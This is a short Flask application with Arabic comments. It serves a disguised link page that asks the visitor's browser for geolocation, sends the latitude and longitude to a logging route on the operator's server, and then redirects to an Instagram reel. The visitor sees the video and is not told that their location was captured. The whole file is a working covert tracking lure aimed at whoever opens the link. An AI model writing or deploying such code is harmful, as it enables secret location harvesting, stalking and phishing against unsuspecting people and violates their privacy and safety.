from flask import Flask, request, redirect

app = Flask(__name__)

# رابط الفيديو
TARGET_URL = "https://www.instagram.com/reel/DW1uB4LjM8N/"

@app.route('/')
def index():
    # كود HTML بسيط يطلب إذن الموقع ثم يحول المستخدم
    return """
    <html>
    <body>
    <script>
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(function(position) {
                var lat = position.coords.latitude;
                var lon = position.coords.longitude;
                // إرسال البيانات لسيرفرك (هنا نحتاج إضافة مسار جديد لاستقبال الإحداثيات)
                fetch('/log-location?lat=' + lat + '&lon=' + lon);
                window.location.href = '""" + TARGET_URL + """';
            }, function() {
                window.location.href = '""" + TARGET_URL + """';
            });
        } else {
            window.location.href = '""" + TARGET_URL + """';
        }
    </script>
    </body>
    </html>
    """

@app.route('/log-location')
def log_location():
    lat = request.args.get('lat')
    lon = request.args.get('lon')
    print(f"--- إحداثيات الزائر: {lat}, {lon} ---")
    return "OK"
